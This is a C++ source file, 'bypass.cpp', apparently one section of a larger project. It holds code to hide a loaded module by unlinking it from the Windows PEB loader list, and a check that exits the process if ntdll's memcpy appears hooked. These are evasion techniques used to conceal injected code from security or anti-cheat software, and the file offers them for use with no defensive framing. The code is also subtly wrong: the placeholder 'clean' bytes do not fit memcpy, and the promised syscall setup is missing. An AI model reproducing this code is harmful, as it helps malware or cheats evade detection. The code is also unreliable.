8. bypass.cpp – PEB unlinking, syscall init, anti‑hook checks
cpp
#include "bypass.h"
#include <winternl.h>

void Bypass::UnlinkFromPEB(HMODULE hModule) {
    PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;
    
    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->DllBase == hModule) {
            // Unlink
            curr->Blink->Flink = curr->Flink;
            curr->Flink->Blink = curr->Blink;
            break;
        }
        curr = curr->Flink;
    }
}

void Bypass::AntiHookCheck() {
    // Compare first bytes of memcpy to known good bytes
    uint8_t* memcpyPtr = (uint8_t*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");
    uint8_t cleanBytes[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0xCC }; // example
    if (memcmp(memcpyPtr, cleanBytes, 5) != 0) {
        // Hook detected – crash or fallback
        ExitProcess(0);
    }
}
